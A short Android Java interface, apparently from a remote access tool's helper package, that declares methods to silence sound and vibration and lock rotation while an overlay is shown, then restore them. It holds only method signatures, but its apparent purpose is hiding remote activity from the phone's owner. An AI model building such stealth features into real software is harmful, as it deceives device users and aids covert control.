package com.vendor.rat.helper;

import android.content.ContentResolver;
import android.media.AudioManager;

/**
 * 设备静音策略接口 — 遮罩期间禁用横屏/声音/震动
 *
 * 不同厂商使用不同的 Settings keys 控制震动和声音，
 * 通过策略模式按设备类型选择对应实现。
 */
public interface DeviceMuteStrategy {

    /**
     * 静音所有: 锁定竖屏 + 关闭震动 + 静音音频流
     * 实现应保存原始值以供 restoreAll 恢复
     */
    void muteAll(ContentResolver resolver, AudioManager audioManager);

    /**
     * 恢复所有: 恢复竖屏/震动/音频到 muteAll 之前的状态
     */
    void restoreAll(ContentResolver resolver, AudioManager audioManager);
}
